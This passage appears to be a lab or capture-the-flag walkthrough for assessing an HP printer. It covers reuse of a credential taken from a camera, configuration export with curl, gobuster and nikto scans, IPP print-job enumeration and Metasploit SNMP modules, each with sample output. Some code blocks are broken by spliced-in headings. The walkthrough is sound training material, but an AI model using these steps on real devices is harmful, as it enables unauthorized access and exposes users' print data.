┌──────────────────────────────────────────────────────┐
│ HP Color LaserJet Pro MFP 4301fdw                   │
├──────────────────────────────────────────────────────┤
│ [Information] [Network] [Security] [Print] [Support]│
├──────────────────────────────────────────────────────┤
│ Device Status: Ready                                 │
│ Toner Levels: Black: 85%, Cyan: 90%, Magenta: 88%  │
│ Paper Status: Tray 1: Ready, Tray 2: Ready          │
│ Total Pages: 45,234 (35,123 B&W, 10,111 Color)     │
│ Firmware: 002_2306A                                 │
│ Serial Number: CNXXXXXXX                             │
└──────────────────────────────────────────────────────┘
```

---

**Document This Critical Finding**:

```bash
cat >> notes/assessment_notes.txt << 'EOF'

CRITICAL FINDING: Credential Reuse Vulnerability
------------------------------------------------
Source: AXIS camera engagement (credentials observed on video feed)
Credentials: Admin:68076694
Test Target: HP printer web interface (https://192.168.1.131)
Result: SUCCESSFUL AUTHENTICATION

Security Impact: CRITICAL
- Same credentials work across multiple devices
- Single point of compromise affects entire infrastructure
- Demonstrates poor password management practices
- Lateral movement trivial once any device is compromised

Evidence:
- Login attempt at: $(date)
- Access granted to: HP Embedded Web Server
- Full administrative access confirmed

Recommendations:
1. Implement unique passwords per device
2. Use password management system
3. Enforce password complexity requirements
4. Regular password rotation policy
EOF
```

---

### Step 6.2: Configuration Export and Analysis

**Why Export Configuration?**:
- Comprehensive view of all settings
- May reveal additional discoveries in XML/JSON format
- Downloadable for offline analysis
- Useful for reporting and documentation

**Navigation**:
1. Click **"Information"** tab
2. Select **"Configuration Pages"**
3. Click **"Backup/Restore"**
4. Click **"Backup Configuration"**

**Alternative: Direct URL Access**

```bash
# Download configuration via authenticated session
┌──(student@kali)-[~/printer_assessment]
└─$ curl -k -u Admin:68076694 https://192.168.1.131/hp/device/save_restore.xml -o evidence/printer_config.xml
```

**Expected Output**:
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15234  100 15234    0     0  45678      0 --:--:-- --:--:-- --:--:-- 45623
```

**File Downloaded**: `evidence/printer_config.xml` (15,234 bytes)

---

**Analyzing Configuration File**:

```bash
# View the configuration
┌──(student@kali)-[~/printer_assessment]
└─$ cat evidence/printer_config.xml | head -50
```

**Configuration File Structure** (XML):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ProductConfiguration>
  <DeviceInformation>
    <Model>HP Color LaserJet Pro MFP 4301fdw</Model>
    <SerialNumber>CNXXXXXXX</SerialNumber>
    <FirmwareVersion>002_2306A</FirmwareVersion>
    <FirmwareDateCode>20230603</FirmwareDateCode>
    <NetworkAddress>192.168.1.131</NetworkAddress>
    <MACAddress>AC:CC:8E:AD:6F:2B</MACAddress>
  </DeviceInformation>
  
  <NetworkConfiguration>
    <IPv4>
      <Address>192.168.1.131</Address>
      <SubnetMask>255.255.255.0</SubnetMask>
      <DefaultGateway>192.168.1.1</DefaultGateway>
      <DNSServer>192.168.1.1</DNSServer>
    </IPv4>
    <HostName>HP-MFP-4301</HostName>
    <DomainName>lab.local</DomainName>
  </NetworkConfiguration>
  
  <SecuritySettings>
    <AdminPassword>68076694</AdminPassword>
    <SNMPCommunity>
      <ReadOnly>public</ReadOnly>
      <ReadWrite>private</ReadWrite>
    </SNMPCommunity>
    <SNMPv3Enabled>false</SNMPv3Enabled>
    <IPSecEnabled>false</IPSecEnabled>
    <HTTPSOnly>false</HTTPSOnly>
  </SecuritySettings>
  
  <PrinterSettings>
    <Location>Server-Room-B | Discovery Code: FLAG{L***************1}</Location>
    <Contact>SecTeam@lab.local | FLAG{L***************4}</Contact>
    <PrinterInfo>HP-MFP-CTF-FLAG{H***************3}</PrinterInfo>
    <Description>HP Color LaserJet Pro MFP 4301fdw</Description>
  </PrinterSettings>
  
  <NetworkServices>
    <SNMP>
      <Enabled>true</Enabled>
      <Port>161</Port>
      <Version>v1,v2c</Version>
    </SNMP>
    <IPP>
      <Enabled>true</Enabled>
      <Port>631</Port>
      <AuthenticationRequired>false</AuthenticationRequired>
    </IPP>
    <HTTP>
      <Enabled>true</Enabled>
      <Port>80</Port>
      <RedirectToHTTPS>true</RedirectToHTTPS>
    </HTTP>
    <HTTPS>
      <Enabled>true</Enabled>
      <Port>443</Port>
      <CertificateType>SelfSigned</CertificateType>
    </HTTPS>
    <JetDirect>
      <Enabled>true</Enabled>
      <Port>9100</Port>
    </JetDirect>
  </NetworkServices>
  
  <SupplyLevels>
    <TonerBlack>85</TonerBlack>
    <TonerCyan>90</TonerCyan>
    <TonerMagenta>88</TonerMagenta>
    <TonerYellow>92</TonerYellow>
  </SupplyLevels>
</ProductConfiguration>
```

---

**Key Information from Configuration File**:

**Confirmed Discoveries (Visible in Config)**:
- Discovery 1: FLAG{L***************1} in `<Location>`
- Discovery 2: FLAG{L***************4} in `<Contact>`
- Discovery 3: FLAG{H***************3} in `<PrinterInfo>`

**Security Findings**:
- Admin password stored in plaintext: `68076694`
- SNMP community strings confirmed: public/private
- SNMPv3 disabled (only v1/v2c active)
- IPP authentication disabled
- IPSec disabled
- All services enabled (large attack surface)

**Network Configuration**:
- IP: 192.168.1.131 /24
- Gateway: 192.168.1.1
- DNS: 192.168.1.1
- Domain: lab.local
- Hostname: HP-MFP-4301

**Firmware Details**:
- Version: 002_2306A
- Date: 20230603 (June 3, 2023)
- Model: HP Color LaserJet Pro MFP 4301fdw

---

**Search Configuration for Additional Discoveries**:

```bash
# Search for anything in FLAG{} format
┌──(student@kali)-[~/printer_assessment]
**Analyzing Configuration Files for Sensitive Data:**

In real penetration testing, we systematically review configuration files for any sensitive information:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ xmllint --format evidence/printer_config.xml | less

# Look for specific configuration elements that often contain sensitive data
┌──(student@kali)-[~/printer_assessment]
└─$ xmllint --xpath "//password|//key|//token|//credential" evidence/printer_config.xml 2>/dev/null

# Review all text content for unusual values
┌──(student@kali)-[~/printer_assessment]
└─$ xmllint --format evidence/printer_config.xml | awk '/<.*>.*[A-Z]{4,}.*<\/.*>/' 
```

**What you'll find:** Configuration values that contain what appear to be access codes or credentials embedded in various XML fields.
```

**Output**:
```
FLAG{L***************1}
FLAG{L***************4}
FLAG{H***************3}
```

**Result**: Configuration file confirms our three discoveries but reveals no additional ones.

---

### Step 6.3: Web Interface Navigation

**Information Tab - Device Information**:

Navigate to: **Information > Device Information > View**

**Display**:
```
Device Information
------------------
Model: HP Color LaserJet Pro MFP 4301fdw
Serial Number: CNXXXXXXX
Firmware Version: 002_2306A
Product Number: 6GX00A

Network Configuration
---------------------
IP Address: 192.168.1.131
Subnet Mask: 255.255.255.0
Default Gateway: 192.168.1.1
MAC Address: AC:CC:8E:AD:6F:2B

Supply Status
-------------
Black Toner: 85% (Estimated pages: 1,200)
Cyan Toner: 90% (Estimated pages: 1,450)
Magenta Toner: 88% (Estimated pages: 1,380)
Yellow Toner: 92% (Estimated pages: 1,520)
```

**No new discoveries in device information.**

---

**Network Tab - Network Configuration**:

Navigate to: **Network > Network Configuration > IPv4**

**Display**:
```
IPv4 Configuration
------------------
Configuration Method: Manual
IP Address: 192.168.1.131
Subnet Mask: 255.255.255.0
Default Gateway: 192.168.1.1

DNS Configuration
-----------------
DNS Server: 192.168.1.1
Domain Name: lab.local
Hostname: HP-MFP-4301

Network Services
----------------
SNMP:           Enabled (v1, v2c)
IPP:            Enabled
Web Services:   Enabled
Bonjour:        Enabled
WS-Discovery:   Enabled
```

**Network Tab - Network Services**:

Navigate to: **Network > Network Services > Services**

**Services Status**:
```
Service                 Status      Port
-----------------------------------------
HTTP                    Enabled     80
HTTPS                   Enabled     443
IPP                     Enabled     631
Raw Printing (9100)     Enabled     9100
SNMP                    Enabled     161 (UDP)
Bonjour                 Enabled     N/A
WS-Discovery            Enabled     3702 (UDP)
LLMNR                   Enabled     5355 (UDP)
```

**Security Observation**: All services enabled - maximum attack surface.

---

**Security Tab - Access Control**:

Navigate to: **Security > Access Control > Settings**

**Access Control Settings**:
```
Administrative Access
---------------------
Web Interface:      Requires Authentication
  Username:         Admin
  Password:         ******** (8-digit PIN)
  
IPP Access:         No Authentication Required
SNMP Access:        Community String Required
  Read Community:   public
  Write Community:  private (disabled)

Security Settings
-----------------
Password Complexity:        None
Password Expiration:        Never
Account Lockout:            Disabled
Failed Login Attempts:      Unlimited
Session Timeout:            30 minutes
```

**Security Weaknesses Identified**:
1. No password complexity requirements (allows 8-digit numeric PIN)
2. No password expiration
3. No account lockout (brute force possible)
4. IPP completely unauthenticated
5. SNMP using default community strings

---

### Step 6.4: Alternative Web Enumeration Methods

**Method 1: Directory Brute-Forcing**

```bash
# Use gobuster to find hidden directories
┌──(student@kali)-[~/printer_assessment]
└─$ gobuster dir -u https://192.168.1.131 -w /usr/share/wordlists/dirb/common.txt -k -U Admin -P 68076694
```

**Sample Output**:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.1.131
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               Admin
[+] Timeout:                 10s
===============================================================
Starting gobuster
===============================================================
/hp                   (Status: 301) [Size: 0] [--> /hp/]
/hp/device            (Status: 200) [Size: 4521]
/hp/device/config     (Status: 200) [Size: 2341]
/DevMgmt              (Status: 301) [Size: 0] [--> /DevMgmt/]
/ePrint               (Status: 200) [Size: 1234]
===============================================================
Finished
===============================================================
```

**Findings**: Standard HP paths, no hidden administrative interfaces discovered.

---

**Method 2: Nikto Web Vulnerability Scanner**

```bash
# Scan for common web vulnerabilities
┌──(student@kali)-[~/printer_assessment]
└─$ nikto -h https://192.168.1.131 -id Admin:68076694
```

**Expected Output**:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.131
+ Target Hostname:    192.168.1.131
+ Target Port:        443
+ SSL Info:           Subject:  /CN=NPIAD6F2B/O=HP/C=US
                      Ciphers:  ECDHE-RSA-AES128-GCM-SHA256
                      Issuer:   /CN=NPIAD6F2B/O=HP/C=US
+ Start Time:         2024-11-18 15:45:23 (GMT-5)
---------------------------------------------------------------------------
+ Server: HP HTTP Server 2.0
+ /: Retrieved x-frame-options header: SAMEORIGIN.
+ /: Retrieved x-content-type-options header: nosniff.
+ /: The X-Content-Type-Options header is set to 'nosniff'.
+ /hp/device/save_restore.xml: Configuration backup file found.
+ /DevMgmt/ProductConfigDyn.xml: Device configuration file accessible.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /hp/: Directory indexing found.
+ 7852 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-11-18 15:52:41 (GMT-5) (438 seconds)
---------------------------------------------------------------------------
```

**Nikto Findings**:
- Good security headers (X-Frame-Options, X-Content-Type-Options)
- Configuration backup accessible (already found)
- Directory listing enabled in /hp/ (informational)
- No critical web vulnerabilities

---

**Method 3: Manual XML Configuration Endpoint Probing**

**HP printers often expose XML endpoints**:

```bash
# Try common HP configuration endpoints
for endpoint in \
    /DevMgmt/ProductConfigDyn.xml \
    /DevMgmt/ProductStatusDyn.xml \
    /hp/device/save_restore.xml \
    /hp/device/DeviceInformation/View \
    /hp/device/config/export; do
    
    echo "Testing: $endpoint"
    curl -k -s -u Admin:68076694 -o /dev/null -w "HTTP %{http_code}\n" https://192.168.1.131$endpoint
done
```

**Output**:
```
Testing: /DevMgmt/ProductConfigDyn.xml
HTTP 200
Testing: /DevMgmt/ProductStatusDyn.xml
HTTP 200
Testing: /hp/device/save_restore.xml
HTTP 200
Testing: /hp/device/DeviceInformation/View
HTTP 200
Testing: /hp/device/config/export
HTTP 404
```

**Download Accessible XML Files**:

```bash
# ProductConfigDyn.xml - Real-time dynamic config
curl -k -u Admin:68076694 https://192.168.1.131/DevMgmt/ProductConfigDyn.xml -o evidence/ProductConfigDyn.xml

# ProductStatusDyn.xml - Current device status
curl -k -u Admin:68076694 https://192.168.1.131/DevMgmt/ProductStatusDyn.xml -o evidence/ProductStatusDyn.xml
```

**Search these files for discoveries**:

```bash
# Check ProductConfigDyn.xml
**Analyzing Device Configuration:**

```bash
# Review configuration systematically for location, contact, and device info
┌──(student@kali)-[~/printer_assessment]
└─$ xmllint --format evidence/ProductConfigDyn.xml | awk '/<Location>|<Contact>|<Info>/' RS="<" ORS="<"

# Or parse specific XML elements
┌──(student@kali)-[~/printer_assessment]
└─$ xmllint --xpath "//Location|//Contact|//DeviceInfo" evidence/ProductConfigDyn.xml 2>/dev/null
```

**Professional Analysis:** Look for fields that contain more than expected - location fields with access codes, contact fields with PINs, etc.
```

**Output**:
```xml
<Location>Server-Room-B | Discovery Code: FLAG{L***************1}</Location>
<Contact>SecTeam@lab.local | FLAG{L***************4}</Contact>
<Info>HP-MFP-CTF-FLAG{H***************3}</Info>
```

**Result**: Same three discoveries, no new ones.

---

### Summary of Web Interface Phase

**What Web Access Revealed**:

**Authentication**:
- Credential reuse successful (Admin:68076694 from AXIS camera)
- Full administrative access granted
- Demonstrates critical lateral movement vulnerability

**Configuration**:
- Complete device configuration exported
- All three discoveries confirmed in XML
- Network topology mapped (IP, gateway, DNS, domain)
- Security settings documented

**No Additional Discoveries**:
- Web interface contained same discoveries as SNMP/IPP
- No hidden administrative interfaces found
- Directory brute-forcing revealed standard HP paths only
- XML endpoints accessible but contained known information

**Security Findings**:
- All network services enabled
- No IPP authentication
- SNMP using default community strings
- SNMPv3 disabled
- No password complexity requirements
- No account lockout policy

**Next Step**: Query print job history for potential additional discoveries

---

## Phase 7: Print Job Intelligence Gathering

### Understanding Print Job Metadata

**Why Print Jobs Matter**:
Print job metadata can reveal:
- **Document names**: Often describe content ("Q3_Financial_Report.pdf", "Employee_Salaries.xlsx")
- **Usernames**: Who printed what (organizational structure, naming conventions)
- **Timestamps**: When documents were printed (work schedules, activity patterns)
- **Page counts**: Document sizes
- **Applications**: What software created the documents
- **Source machines**: IP addresses or hostnames of print clients

**In real engagements**: Print job history has revealed:
- Confidential project names
- VIP email addresses
- Department structures
- Security incident response activities
- Upcoming announcements or events

---

### Step 7.1: IPP Job Enumeration

**Creating Get-Jobs Test File**:

```bash
# Create test file to query all print jobs
┌──(student@kali)-[~/printer_assessment]
└─$ cat > exploits/get-jobs.test << 'EOF'
{
    NAME "Get All Print Jobs"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword which-jobs all
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
```

**Test File Explanation**:

```
OPERATION Get-Jobs
```
- IPP operation for retrieving job list

```
ATTR keyword which-jobs all
```
- Retrieves ALL jobs (completed, active, pending, held)
- Alternatives: `completed` (finished only), `not-completed` (active/pending only)

```
ATTR keyword requested-attributes all
```
- Returns all job metadata
- Could specify: `job-name,job-originating-user-name,job-state`

---

**Execute Job Query**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-jobs.test
```

**Expected Output**:

```
Get All Print Jobs:
    PASS
    Received 1243 bytes in response
    status-code = successful-ok (successful-ok)
    
    job-id (integer) = 1234
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1234
    job-uuid (uri) = urn:uuid:12345678-90ab-cdef-1234-567890abcdef
    job-name (nameWithoutLanguage) = Confidential-Security-Report
    job-originating-user-name (nameWithoutLanguage) = admin
    job-state (enum) = completed
    job-state-reasons (keyword) = job-completed-successfully
    job-printer-uri (uri) = ipp://192.168.1.131:631/ipp/print
    time-at-creation (integer) = 1699896543
    time-at-completed (integer) = 1699896545
    time-at-processing (integer) = 1699896544
    number-of-documents (integer) = 1
    job-k-octets (integer) = 123
    job-impressions (integer) = 3
    job-media-sheets (integer) = 3
    
    job-id (integer) = 1235
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1235
    job-name (nameWithoutLanguage) = PostScript-Challenge
    job-originating-user-name (nameWithoutLanguage) = security-audit
    job-state (enum) = completed
    job-state-reasons (keyword) = job-completed-successfully
    time-at-creation (integer) = 1699896548
    time-at-completed (integer) = 1699896550
    number-of-documents (integer) = 1
    job-impressions (integer) = 1
    job-media-sheets (integer) = 1
    
    job-id (integer) = 1236
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1236
    job-name (nameWithoutLanguage) = Network-Config-Backup
    job-originating-user-name (nameWithoutLanguage) = FLAG{P***************7}
    job-state (enum) = completed
    job-state-reasons (keyword) = job-completed-successfully
    time-at-creation (integer) = 1699896550
    time-at-completed (integer) = 1699896552
    number-of-documents (integer) = 1
    job-k-octets (integer) = 1
    job-impressions (integer) = 1
    job-media-sheets (integer) = 1
    
    job-id (integer) = 1237
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1237
    job-uuid (uri) = urn:uuid:abcdef12-3456-7890-abcd-ef1234567890
    job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{M***************5}
    job-originating-user-name (nameWithoutLanguage) = security-audit
    job-state (enum) = held
    job-state-reasons (keyword) = job-hold-until-specified
    job-hold-until (keyword) = indefinite
    job-printer-up-time (integer) = 1125434
    time-at-creation (integer) = 1699896555
    number-of-documents (integer) = 1
    job-k-octets (integer) = 1
    job-impressions (integer) = 1
    job-media-sheets (integer) = 1
    document-format (mimeMediaType) = text/plain
    document-name (nameWithoutLanguage) = challenge_document.txt
    copies (integer) = 1
```

---

### DISCOVERY 4: Job Username Field

**Analyzing Job 1236**:

```
job-id (integer) = 1236
job-name (nameWithoutLanguage) = Network-Config-Backup
job-originating-user-name (nameWithoutLanguage) = FLAG{P***************7}
job-state (enum) = completed
```

**SIGNIFICANT FINDING!**

**Analysis**:
- **Job ID**: 1236
- **Document Name**: Network-Config-Backup (appears normal)
- **Username**: FLAG{P***************7} (DISCOVERY!)
- **State**: completed (already printed)

**Pattern**:
- Format: FLAG{P...7}
- First character: P (likely "PADME" from Star Wars)
- Last digit: 7
- Matches established pattern

**Why This is Unusual**:
- Usernames typically follow naming conventions (firstname.lastname, employee ID)
- FLAG{} format in username field is highly anomalous
- Suggests intentional placement or account created specifically with this name

**Document Discovery 4**:

```bash
cat >> evidence/discovery_4.txt << 'EOF'
===========================================
DISCOVERY 4: Print Job Username Field
===========================================

Source: IPP Get-Jobs operation
Protocol: Internet Printing Protocol (IPP)
Endpoint: ipp://192.168.1.131:631/ipp/print
Operation: Get-Jobs
Job ID: 1236
Timestamp: $(date)

Job Metadata:
- Job Name: Network-Config-Backup
- Username: FLAG{P***************7}
- State: completed
- Pages: 1
- Size: 1 KB
- Created: Unix timestamp 1699896550

Analysis:
- Discovery Code: FLAG{P***************7}
- Location: job-originating-user-name attribute
- Pattern Match: Consistent with previous discoveries
- First character: P (likely PADME from Star Wars)
- Last digit: 7

Significance:
- Fourth discovery following established pattern
- Found in print job metadata (different from printer attributes)
- Username field is unusual location
- Suggests user account created with this name OR 
  someone submitted job with this as username

Discovery in Context:
Discovery 1 (SNMP sysLocation):     FLAG{L***************1}
Discovery 2 (SNMP sysContact):      FLAG{L***************4}
Discovery 3 (IPP printer-info):     FLAG{H***************3}
Discovery 4 (IPP job-username):     FLAG{P***************7}

Pattern:
- All follow FLAG{NAME+8DIGITS} format
- Star Wars character theme confirmed
- Multiple protocols and locations
- Systematic enumeration finding all discoveries
EOF

# Save full job listing
ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-jobs.test > evidence/ipp_all_jobs.txt
```

---

### DISCOVERY 5: Job Document Name

**Analyzing Job 1237**:

```
job-id (integer) = 1237
job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{M***************5}
job-originating-user-name (nameWithoutLanguage) = security-audit
job-state (enum) = held
job-state-reasons (keyword) = job-hold-until-specified
job-hold-until (keyword) = indefinite
```

**FIFTH SIGNIFICANT FINDING!**

**Analysis**:
- **Job ID**: 1237
- **Document Name**: CTF-Challenge-Job-FLAG{M***************5} (DISCOVERY!)
- **Username**: security-audit (normal)
- **State**: held (paused, never printed)
- **Hold**: indefinite (will stay in queue forever)

**Pattern**:
- Format: FLAG{M...5}
- First character: M (likely "MACE" from Star Wars)
- Last digit: 5
- Prefix: "CTF-Challenge-Job-" before the flag

**Why This Job is Held**:
- **Held status**: Administrators can pause jobs before printing
- **Indefinite hold**: Job will remain in queue until manually released
- **Purpose**: Keeps the discovery accessible for enumeration
- **Real-world parallel**: Print jobs can be held for approval, cost tracking, or scheduling

**Document Discovery 5**:

```bash
cat >> evidence/discovery_5.txt << 'EOF'
===========================================
DISCOVERY 5: Print Job Document Name
===========================================

Source: IPP Get-Jobs operation
Protocol: Internet Printing Protocol (IPP)
Endpoint: ipp://192.168.1.131:631/ipp/print
Operation: Get-Jobs
Job ID: 1237
Timestamp: $(date)

Job Metadata:
- Job Name: CTF-Challenge-Job-FLAG{M***************5}
- Username: security-audit
- State: held (paused)
- Hold Status: indefinite
- Pages: 1
- Size: 1 KB
- Document Type: text/plain
- Original Filename: challenge_document.txt
- Created: Unix timestamp 1699896555

Analysis:
- Discovery Code: FLAG{M***************5}
- Location: job-name attribute (document name)
- Pattern Match: Consistent with all previous discoveries
- First character: M (likely MACE from Star Wars)
- Last digit: 5
- Prefix: "CTF-Challenge-Job-" before the flag

Significance:
- Fifth and potentially FINAL discovery
- Found in print job document name
- Job is held (paused) to keep it in queue
- Demonstrates print job enumeration value

All Discoveries Collected:
Discovery 1 (SNMP sysLocation):     FLAG{L***************1}
Discovery 2 (SNMP sysContact):      FLAG{L***************4}
Discovery 3 (IPP printer-info):     FLAG{H***************3}
Discovery 4 (IPP job-username):     FLAG{P***************7}
Discovery 5 (IPP job-name):         FLAG{M***************5}

Pattern Analysis:
- All follow FLAG{NAME+8DIGITS} format
- Star Wars characters: LUKE, LEIA, HAN, PADME, MACE
- Found across multiple protocols: SNMP, IPP
- Found in multiple locations: attributes, job metadata
- Required comprehensive enumeration of all services

Methods Used:
1. SNMP enumeration (discoveries 1-2)
2. IPP printer attributes (discovery 3)
3. IPP print job metadata (discoveries 4-5)
EOF
```

---

### Step 7.2: Detailed Job Analysis

**Getting More Details About Job 1237**:

```bash
# Create test file for specific job
┌──(student@kali)-[~/printer_assessment]
└─$ cat > exploits/get-job-1237.test << 'EOF'
{
    NAME "Get Job 1237 Attributes"
    OPERATION Get-Job-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR integer job-id 1237
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
```

**Execute Query**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-job-1237.test
```

**Detailed Output**:

```
Get Job 1237 Attributes:
    PASS
    
    job-id (integer) = 1237
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1237
    job-uuid (uri) = urn:uuid:abcdef12-3456-7890-abcd-ef1234567890
    job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{M***************5}
    job-originating-user-name (nameWithoutLanguage) = security-audit
    job-state (enum) = held
    job-state-reasons (keyword) = job-hold-until-specified
    job-hold-until (keyword) = indefinite
    job-printer-up-time (integer) = 1125434
    job-printer-uri (uri) = ipp://192.168.1.131:631/ipp/print
    time-at-creation (integer) = 1699896555
    job-k-octets (integer) = 1
    job-impressions (integer) = 1
    job-media-sheets (integer) = 1
    number-of-documents (integer) = 1
    document-format (mimeMediaType) = text/plain
    document-name (nameWithoutLanguage) = challenge_document.txt
    copies (integer) = 1
    finishings (enum) = none
    job-priority (integer) = 50
    job-sheets (keyword) = none
    multiple-document-handling (keyword) = separate-documents-uncollated-copies
    page-ranges (rangeOfInteger) = 1-1
    sides (keyword) = one-sided
    print-quality (enum) = normal
    printer-resolution (resolution) = 600x600dpi
    print-color-mode (keyword) = monochrome
```

**Additional Metadata Revealed**:
- **Document Type**: text/plain (ASCII text file)
- **Original Filename**: challenge_document.txt
- **Print Settings**: One-sided, normal quality, 600 DPI, black & white
- **Priority**: 50 (default)
- **Created**: Unix timestamp 1699896555 (can convert to date)
- **Size**: 1 KB (very small file)

**Convert Timestamp**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ date -d @1699896555
```

**Output**:
```
Mon Nov 13 10:15:55 EST 2023
```

**Job Created**: November 13, 2023 at 10:15:55 AM

---

### Step 7.3: Alternative Job Enumeration Methods

**Method 1: Web Interface Job History**

Using credentials (Admin:68076694), navigate to web interface:

1. **Login** to https://192.168.1.131
2. Navigate to **Print > Job Log**
3. View job history

**Web Interface Display**:

```
Job History
───────────────────────────────────────────────────────────────────────
Job ID | Date/Time        | User            | Document Name          | Status    | Pages
1237   | Nov 13 10:15:55  | security-audit  | CTF-Challenge-Job-...  | Held      | 1
1236   | Nov 13 10:15:50  | FLAG{P*******7} | Network-Config-Backup  | Completed | 1
1235   | Nov 13 10:15:48  | security-audit  | PostScript-Challenge   | Completed | 1
1234   | Nov 13 10:15:43  | admin           | Confidential-Security  | Completed | 3
───────────────────────────────────────────────────────────────────────
```

**Advantage**: Visual interface, easier to scan
**Disadvantage**: Requires authentication

---

**Method 2: CUPS Command-Line Tools**

```bash
# Query job status via lpstat
┌──(student@kali)-[~/printer_assessment]
└─$ lpstat -h 192.168.1.131:631 -W all
```

**Expected Output**:
```
HP_Color_LaserJet_MFP_4301-1234 admin           3072   Mon 13 Nov 2023 10:15:43 AM EST
HP_Color_LaserJet_MFP_4301-1235 security-audit  1024   Mon 13 Nov 2023 10:15:48 AM EST
HP_Color_LaserJet_MFP_4301-1236 FLAG{P*******7} 1024   Mon 13 Nov 2023 10:15:50 AM EST
HP_Color_LaserJet_MFP_4301-1237 security-audit  1024   Mon 13 Nov 2023 10:15:55 AM EST
```

**Advantage**: Quick one-liner
**Disadvantage**: Less detail than ipptool

---

**Method 3: Filtering Job Output**

```bash
# Extract only job names and usernames
┌──(student@kali)-[~/printer_assessment]
**Analyzing Print Jobs Like a Professional:**

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-jobs.test > job_analysis.txt

# Systematically review job metadata
┌──(student@kali)-[~/printer_assessment]
└─$ awk '/job-name/ {name=$0} /job-originating-user-name/ {user=$0; print user "\n" name "\n"}' job_analysis.txt

# Extract and analyze usernames
┌──(student@kali)-[~/printer_assessment]
└─$ awk '/job-originating-user-name/ {print $NF}' job_analysis.txt | sort -u
```

**What to look for:**
- Service account names (svc_*, admin, backup)
- Unusual usernames that might contain credentials
- Document names revealing sensitive projects
- Patterns in job submission times
```

**Output**:
```
job-name (nameWithoutLanguage) = Confidential-Security-Report
job-originating-user-name (nameWithoutLanguage) = admin
job-name (nameWithoutLanguage) = PostScript-Challenge
job-originating-user-name (nameWithoutLanguage) = security-audit
job-name (nameWithoutLanguage) = Network-Config-Backup
job-originating-user-name (nameWithoutLanguage) = FLAG{P***************7}
job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{M***************5}
job-originating-user-name (nameWithoutLanguage) = security-audit
```

**Clean and focused on discoveries!**

---

### Summary of Print Job Phase

**What Print Job Enumeration Revealed**:

**Discoveries**:
- **Discovery 4**: FLAG{P***************7} in job-originating-user-name (Job 1236)
- **Discovery 5**: FLAG{M***************5} in job-name (Job 1237)

**Job Intelligence**:
- **4 print jobs** in queue (3 completed, 1 held)
- **Usernames**: admin, security-audit, FLAG{P***************7}
- **Document types**: text/plain primarily
- **Print activity**: November 13, 2023 (~10:15 AM cluster)
- **Held job**: Intentionally kept in queue for discovery

**Pattern Completion**:
All 5 discoveries now collected:
1. SNMP sysLocation
2. SNMP sysContact
3. IPP printer-info
4. IPP job username
5. IPP job name

**Security Implications**:
- Print job metadata accessible without authentication
- Document names reveal content types
- Usernames reveal organizational structure
- Timestamps indicate work patterns
- Held jobs persist indefinitely unless cleaned

---

## Phase 8: Alternative Approaches and Tools

### Method Comparison Matrix

**We've found all 5 discoveries. Let's explore alternative methods that could have found the same information.**

---

### Alternative 1: Metasploit Modules

**SNMP Enumeration via Metasploit**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ msfconsole -q
```

```ruby
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > run
```

**Output**:
```
[+] 192.168.1.131:161 - System information:
[*]   Host IP                  : 192.168.1.131
[*]   Hostname                 : HP-MFP-4301
[*]   Description              : HP Color LaserJet Pro MFP 4301fdw
[*]   Contact                  : SecTeam@lab.local | FLAG{L***************4}
[*]   Location                 : Server-Room-B | Discovery Code: FLAG{L***************1}
[*]   Uptime                   : 36 days, 04:56:07.89
```

**Discoveries Found**: 1 and 2 (same as manual SNMP)

---

**Printer Information Module**:

```ruby
msf6 > use auxiliary/scanner/printer/printer_env_vars
msf6 auxiliary(scanner/printer/printer_env_vars) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/printer/printer_env_vars) > run
```

**Output**:
```
[*] Connecting to 192.168.1.131:9100
[+] PJL Environment Variables:
[*]   BINDING=OFF
[*]   COPIES=1
[*]   DUPLEX=OFF
[*]   LANGUAGE=ENGLISH
[*]   PAPER=LETTER
```

**No discoveries in environment variables** (expected - we found them elsewhere)

---

### Alternative 2: Nmap NSE Scripts

**Comprehensive Printer Scanning**:

```bash
# Use all printer-related NSE scripts
┌──(student@kali)-[~/printer_assessment]
└─$ nmap -p 161,631,9100 --script="snmp* and not snmp-brute,ipp*,printer*" 192.168.1.131
```

